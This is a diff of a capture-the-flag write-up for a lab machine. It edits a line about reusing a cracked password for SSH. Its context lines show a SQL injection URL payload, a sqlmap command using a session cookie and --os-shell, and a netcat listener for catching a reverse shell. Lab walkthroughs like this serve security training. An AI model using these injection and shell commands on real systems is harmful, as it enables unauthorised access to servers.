@@ -50,7 +50,7 @@ http://10.10.10.46/dashboard.php?search=elixir%27%20union%20all%20select%20NULL,
 I tried crack this hash with john and hashcat, however a quick google search could saved some time  
 ![alt text](./img/vaccine11.PNG?raw=true)  
 
-With this credential we can connect to port 22 of this server:  
+Remove the username from the found password and we have the correct credential, now we can connect to port 22(ssh) of this server:  
 PS: we could use the sqlmap flag --os-shell to gain a shell and after gain an upgraded reverse shell with the next commands. However i lost the connection sometimes with this method  
 - sqlmap -u http://10.10.10.46/dashboard.php?search=elixir --cookie PHPSESSID=qihiab8965c78chkp3u245b13e --os-shell  
 - Attacker box: nc -nvlp 1234  
